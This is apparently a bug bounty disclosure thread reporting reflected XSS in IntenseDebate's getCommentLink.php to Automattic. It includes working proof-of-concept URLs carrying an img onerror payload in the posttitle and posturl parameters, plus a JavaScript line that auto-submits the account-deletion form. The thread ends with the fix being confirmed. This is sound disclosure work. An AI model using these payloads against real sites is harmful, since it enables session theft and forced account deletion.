title: Reflected XSS in https://www.intensedebate.com/js/getCommentLink.php

profile.name: Automattic
profile.about: WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!

vulnerability_information: Hey there, I have found a reflected dom xss vulnerability in your website www.intensedebate.com, the *posttitle* parameter is vulnerable. --------------------------------------------------------------------------------------------------------------------------------------------------- **Full url:** https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=xss **Parameter:** posttitle **XSS Payload:** "> --------------------------------------------------------------------------------------------------------------------------------------------------- **Steps to reproduce:** Just load this url in your browser and you will get the xss popup https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posttitle=%3Cimg%20src=x%20onerror=alert(document.domain)%3E --------------------------------------------------------------------------------------------------------------------------------------------------- **POC:** {F1094491} ----------------------------------------------------------------------------------------------------------------------------------------------------- ## Impact An attacker steal cookies of logged in users just by sending the url with the xss-payload, can redirect users to another websites,virtual defacement,etc. Also Looking at the page: https://www.intensedebate.com/your-information, there are two actions available *Account Closure*, *Data export* with the xss we can perform this action on behalf of the user for eg: ```javascript document.getElementById('frm2').submit(); ``` With a js code like this we can auto submit this form so that when the user visits the url, his/her account will automatically will be deleted. Thankyou Kind Regards Sudhanshu

activities.message: Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.
Hey @xknown , let me know if more info is required?

Hey @xknown,
Can I know why my both of reports are still in new state evern after 7days?
Atleast make a response if there is any porblem in this report.

I will have to request mediation support if I still didn't get any response.
Hi @sudi, sorry for the delayed reply. We have a backlog of issues, and I already notified the team that maintains this service. I'll let you know once we have a patch ready.

No worries @xknown, I just wanted to make sure you were able to reproduce the bug :).

Can you update the status of the report to `triaged` if everything is fine with this report and  #1043523?

Regards
Sudhanshu

Hey sorry about that previous comment which I made regarding asking for update and complaining why my report wasn't triaged yet.

My mistake I should have shown more patience there (out of 7days 2days were weekends)

Happy weekends!!
Hi @sudi, thanks for the report. This should be fixed now, if you'd like to confirm?
Hey @roundhill, the xss is still reproducible. It's not fixed.
HI @sudi, can you check again? Could have been a deploy issue from our side that should be fixed for you now.

Hey @roundhill, I can still reproduce this by inputting the xss payload in the other parameter which is `posturl`. Can you make a fix for all the parameters?


https://www.intensedebate.com/js/getCommentLink.php?acct=c90a61ed51fd7b64001f1361a7a71191&postid=https://web.archive.org/web/20170820134008/https://mronline.org/2010/12/08/jobs-liberty-and-the-bottom-line/&posturl=https://web.archive.org/web/20170820134008/%22%3E%3Cimg%20src=x%20onerror=alert()%3E
Hi @sudi can you try again? We've deployed a fix.

Hey @jgcaruso, I can confirm the fix.
 The xss is not reproducible anymore.

Thankyou
Hi, we would like thank you again for your submission and helping make Automattic a safer place. We look forward to more reports from you in the future.
